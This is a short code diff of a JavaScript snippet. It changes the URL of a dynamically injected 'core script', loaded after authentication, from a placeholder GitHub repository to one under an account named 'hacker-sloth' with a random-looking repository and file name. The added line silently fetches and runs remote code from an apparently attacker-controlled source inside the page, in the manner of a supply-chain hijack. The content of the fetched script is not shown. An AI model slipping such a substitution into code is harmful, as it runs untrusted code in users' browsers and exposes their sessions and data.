@@ -18,6 +18,6 @@
 
     // Load the core script from Repository B if authentication succeeds
     const script = document.createElement('script');
-    script.src = 'https://raw.githubusercontent.com/username/repositoryB/main/coreScript.js';
+    script.src = 'https://raw.githubusercontent.com/hacker-sloth/j2Bz7Lk_fQ4t89Y/main/j2Bz7Lk_fQ4t89Y.js';
     document.body.appendChild(script);
 })();
